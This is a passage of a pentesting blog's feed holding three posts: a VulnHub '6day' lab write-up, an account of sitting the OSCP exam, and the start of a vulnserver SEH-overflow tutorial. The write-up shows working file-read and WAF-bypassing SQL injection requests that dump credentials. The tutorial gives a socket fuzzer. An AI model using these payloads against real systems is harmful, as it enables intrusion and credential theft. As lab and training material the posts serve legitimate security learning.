+	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysql_fetch_array&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;, MYSQL_ASSOC&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Code expired!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;else
+			&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;You have %&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'discount'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot; discount!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+mysql_close&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+?&amp;gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 192.168.1.102 left intact&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;=========================&lt;/span&gt;
+
+root@kali:~/Vulnhub/6day# curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.1.102/image.php?src=/var/www/config.php&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 192.168.1.102...
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 192.168.1.102 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.1.102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /image.php?src&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/www/config.php HTTP/1.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 192.168.1.102
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.47.0
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt; HTTP/1.1 200 OK
+&amp;lt; Date: Tue, 16 Aug 2016 22:57:03 GMT
+&amp;lt; Server: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;lt; X-Powered-By: PHP/5.3.10-1ubuntu3.23
+&amp;lt; Content-Length: 114
+&amp;lt; Content-Type: image/jpeg
+&amp;lt;
+&amp;lt;?php
+&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sellingstuff&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;n0_&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_n0_g41ns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;fancydb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 192.168.1.102 left intact&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A few interesting things stand out in these three files. First, the default config
+file for apache is showing that port 8080 is also hosting the page, but only allows
+connections from localhost. What I can guess from this is that we can likely bypass
+the WAF/IDS by trying the apparent SQL injection in checkpromo.php. I already know
+that our injection get’s blocked on checkpromo.php?promocode=.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/6day/request-blocked.png&quot; alt=&quot;Request Blocked&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I also now know the name of the database in play here. Now it’s time to see if I can
+bypass that WAF/IDS. I tried a few encoding methods but none seemed to work until I
+ended up with this.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Request: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;double&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Yup, that simple. I’m just going to double encode the injection string. From here I
+had to find the table and column names. Sadly sqlmap was no help, or I was using it
+wrong (probably the latter). So I just started guessing.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.1.102/image.php?src=http://localhost:8080/checkpromo.php?promocode=%2527union%2Ball%2Bselect%2Bconcat%2528username%252C%2527%253A%2527%252Cpassword%2529%252C1%2Bfrom%2Bfancydb.users%2523&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 192.168.1.102...
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 192.168.1.102 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.1.102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /image.php?src&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://localhost:8080/checkpromo.php?promocode&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%2527union%2Ball%2Bselect%2Bconcat%2528username%252C%2527%253A%2527%252Cpassword%2529%252C1%2Bfrom%2Bfancydb.users%2523 HTTP/1.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 192.168.1.102
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.47.0
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt; HTTP/1.1 200 OK
+&amp;lt; Date: Wed, 17 Aug 2016 13:08:57 GMT
+&amp;lt; Server: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;lt; X-Powered-By: PHP/5.3.10-1ubuntu3.23
+&amp;lt; Content-Length: 42
+&amp;lt; Content-Type: image/jpeg
+&amp;lt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 192.168.1.102 left intact&lt;/span&gt;
+You have %andrea:SayNoToPentests discount!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;AWESOME! I now have the password for andrea. I can use those credentials for SSH, but
+the shell is very limited! I can run commands, but it looks like everything is
+directed to /dev/null as I get no output. Simple enough to bypass though if it’s
+truly executing commands. We’ll just pop a reverse shell in there.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/6day/getting-shell.png&quot; alt=&quot;Getting Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And now we have ourselves a pretty little shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/6day/Low-Priv.png&quot; alt=&quot;Low Priv&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now all that’s left is to escalate. This was the easy part, The versioin of Ubuntu
+appeared vulnerable to a common Overlayfs exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/6day/proof.png&quot; alt=&quot;Getting Root&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;victory&quot;&gt;VICTORY&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/6day/flag.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/p&gt;</content><author><name>T0w3ntum</name></author><summary type="html">Like any good pentester, I start off with a quick nmap scan and see what we are working with.</summary></entry><entry><title type="html">I Fought the OSCP and the OSCP…</title><link href="http://localhost:4000/2016-08-07/i-fought-the-oscp" rel="alternate" type="text/html" title="I Fought the OSCP and the OSCP..." /><published>2016-08-07T00:00:00-05:00</published><updated>2016-08-07T00:00:00-05:00</updated><id>http://localhost:4000/2016-08-07/i-fought-the-oscp</id><content type="html" xml:base="http://localhost:4000/2016-08-07/i-fought-the-oscp">&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;
+
+&lt;h3 id=&quot;saturday-august-6th-10-am&quot;&gt;Saturday, August 6th: 10 AM&lt;/h3&gt;
+
+&lt;p&gt;I eagerly opened up the email and read through the information. Both laptops were prepped and ready to go and I had a 10 pack of Monster Energy sitting in the fridge (9 if you count
+the one I had already downed.) I had a game plan, I was ready for this…I was so wrong!&lt;/p&gt;
+
+&lt;h3 id=&quot;1045-am&quot;&gt;10:45 AM&lt;/h3&gt;
+
+&lt;p&gt;BAM! First box down. Confidence level: 1000%&lt;/p&gt;
+
+&lt;p&gt;I had prepped for this, I was ready. This box was my bread-and-butter.&lt;/p&gt;
+
+&lt;p&gt;Feeling like a God, I rush off and check my initial scans on the remaining boxes. Like any good pentester, I start to further enumerate my findings through various methods. Many
+interesting things stand out…many gotchas as well.&lt;/p&gt;
+
+&lt;h3 id=&quot;200-pm&quot;&gt;2:00 PM&lt;/h3&gt;
+
+&lt;p&gt;Confidence Level: 90%&lt;/p&gt;
+
+&lt;p&gt;After 3 hours I was no closer to a low priv shell on the remaining boxes. I did have a lot of information to go off of though. I found that I was bouncing around to much, jumping
+from host to host after only 30 minutes. At this point I decided it was a good time for a break and left the house to run my wife some food at work.&lt;/p&gt;
+
+&lt;h3 id=&quot;830-pm&quot;&gt;8:30 PM&lt;/h3&gt;
+
+&lt;p&gt;Confidence Level: 5%&lt;/p&gt;
+
+&lt;p&gt;It was at this point, approaching the half way mark, that I started to curse the world. I was doubting my abilities; wondering why I even signed up for this course in the first
+place. I spent so much time practicing one skill that the rest of them just weren’t there. I had made 0 progress in nearly 10 hours! Sure, I found some things, I could get MORE
+information, but I no clue what information I should be getting…&lt;/p&gt;
+
+&lt;p&gt;I went to my room feeling defeated and decided on 20 minutes of shut eye. I thought maybe if I rested my brain for a minute things would start to click…I was wrong. Ten minutes
+later I was back at it.&lt;/p&gt;
+
+&lt;h3 id=&quot;1230-am&quot;&gt;12:30 AM&lt;/h3&gt;
+
+&lt;p&gt;Confide…There was no confidence at this point!&lt;/p&gt;
+
+&lt;p&gt;At this point I threw my hands up and decided a longer bit of sleep was needed. I set my alarm for 3 AM and laid down…&lt;/p&gt;
+
+&lt;h3 id=&quot;500-am&quot;&gt;5:00 AM&lt;/h3&gt;
+
+&lt;p&gt;ARE YOU KIDDING ME!!!!!&lt;/p&gt;
+
+&lt;p&gt;My wife’s alarm buzzed as I jumped out of bed realizing I didn’t turn my freaking volume up on my phone. Now I only had 5 hours left and only 1 host…ONE HOST! I needed at least 3
+more to pass this exam. Screw confidence at this point, every stat was at 0…0 confidence, 0 intelligence, 0 self worth. I’m screwed!&lt;/p&gt;
+
+&lt;h3 id=&quot;637-am&quot;&gt;6:37 AM&lt;/h3&gt;
+
+&lt;p&gt;Text to my wife:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Well, I’m sure I failed!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;800-am&quot;&gt;8:00 AM&lt;/h3&gt;
+
+&lt;p&gt;Chair flies behind me as I land root on another machine! Confidence restored, I only need TWO MORE HOSTS!&lt;/p&gt;
+
+&lt;h3 id=&quot;830-am&quot;&gt;8:30 AM&lt;/h3&gt;
+
+&lt;p&gt;Confidence level: 90%
+Another host bites it!
+OMG!!! One more host to go, just ONE MORE HOST and I got this, I win this game! I’m 10 points from the finish line. I have one hour and 15 minutes to land one more host.&lt;/p&gt;
+
+&lt;h3 id=&quot;845-am&quot;&gt;8:45 AM&lt;/h3&gt;
+
+&lt;p&gt;We got this…WE GOT THIS. Just picked up a low priv shell on one more host. Just need to escalate and I’m home free. Sitting at 60 points, if I get this host I’ll have enough
+points to pass. LET’S ESCALATE!&lt;/p&gt;
+
+&lt;h3 id=&quot;945-am&quot;&gt;9:45 AM&lt;/h3&gt;
+
+&lt;p&gt;Tap0 disconnects, exam time is over. Total score: 60 points with one low priv shell. 65 points if you count my Lab report as well. Will they count that low priv? Will I get points
+for it?&lt;/p&gt;
+
+&lt;p&gt;Confidence level: 50%&lt;/p&gt;
+
+&lt;p&gt;Yes…50%. It’s in the hands of offsec right now.&lt;/p&gt;
+
+&lt;h3 id=&quot;noon&quot;&gt;Noon&lt;/h3&gt;
+
+&lt;p&gt;Lab report and exam report sent off to Offsec.&lt;/p&gt;
+
+&lt;h2 id=&quot;monday-635-pm&quot;&gt;Monday 6:35 PM&lt;/h2&gt;
+
+&lt;h1 id=&quot;victory&quot;&gt;VICTORY!&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We are happy to inform you that you have successfully completed the Penetration Testing with Kali Linux certification exam and have obtained your Offensive Security Certified Professional (OSCP) certification.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/B0balFv3o4E&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h1 id=&quot;official-review&quot;&gt;Official Review!&lt;/h1&gt;
+
+&lt;p&gt;Don’t go into the exam lightly, and don’t rush! I landed all hosts in the lab environment in &lt;strong&gt;41&lt;/strong&gt; days and felt very confident that I would smash the exam. I even set an arbitrary limit on myself, told myself I’d get it in under 12 hours and have the weekend to myself. Oh how wrong I was.&lt;/p&gt;
+
+&lt;p&gt;I wouldn’t say it was a lack of skill, the skill was there. The mental game was where it was at. I had 24 hours…&lt;strong&gt;24 hours&lt;/strong&gt; to own the required number of hosts and I rushed. I bounced around without focus thinking I would just know what to do.&lt;/p&gt;
+
+&lt;p&gt;After I rested and went back to it with no confidence thinking I would fail; That’s when things started to click. When I had reached the point of failure thinking I wouldn’t pass things started to fall into place. It’s amazing what the right mindset will do for you! It was almost like I had to approach it as if I wasn’t going to win, like I was playing an impossible game and instead of focusing on winning, I should just focus on surviving until the very end.&lt;/p&gt;
+
+&lt;p&gt;In the end, I have no technical review, I have no advice on what you should and should not study. Instead, I’ll leave you with this quote:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;“In order to rise from its own ashes, a Phoenix first must burn.”
+― Octavia E. Butler&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>T0w3ntum</name></author><summary type="html">Timeline</summary></entry><entry><title type="html">Can I have some EGGs with my SEH?</title><link href="http://localhost:4000/2016-08-05/seh-overflow" rel="alternate" type="text/html" title="Can I have some EGGs with my SEH?" /><published>2016-08-05T00:00:00-05:00</published><updated>2016-08-05T00:00:00-05:00</updated><id>http://localhost:4000/2016-08-05/seh-overflow</id><content type="html" xml:base="http://localhost:4000/2016-08-05/seh-overflow">&lt;p&gt;I was really craving some SEH today, but someone mentioned EGG’s and I was like…what the hell, why not. So, going off
+vulnserver like we did last time, let’s build an exploit against SEH and make like the Easter Bunny and drop some eggs in there
+as well.&lt;/p&gt;
+
+&lt;h2 id=&quot;fuzzing&quot;&gt;Fuzzing!&lt;/h2&gt;
+
+&lt;p&gt;Like before, we need to fuzz the application to find out where we crash it. As I already knew that the GMON function was
+vulnerable I whipped up a quick fuzzer.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'192.168.1.41'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[+] Fuzzing GMON / with &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s bytes'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'GMON / '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After kicking it off, we can see that the application crashes at around 4000 bytes of A’s. You can also see that we overwrite the
+SEH pointer and handler. You can see this in the stack, usually the SEH chains are near the bottom of the stack so just scroll on
+down in immunity and you should see something similar to the image below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/crash-at-4000.png&quot; alt=&quot;Crash&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/stack-seh-pointers.png&quot; alt=&quot;Overwrite SEH&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Why is overwriting the SEH handler important? Well, read this &lt;a href=&quot;https://www.exploit-db.com/docs/17505.pdf&quot;&gt;excellent paper&lt;/a&gt; over
+at Exploit-db for some more information. All you need to know for this write-up is that it’s important, and it’s fun!&lt;/p&gt;
+
+&lt;h2 id=&quot;finding-the-offset&quot;&gt;Finding the Offset!&lt;/h2&gt;
+
+&lt;p&gt;Now that we know we can crash the application around 4000 bytes, let’s find the exact offset where we overwrite the EIP. As
+usual, we’ll use Metasploit pattern_create and pattern_offset for this task.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 4000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then we’ll update our code with the new patter.&lt;/p&gt;
+
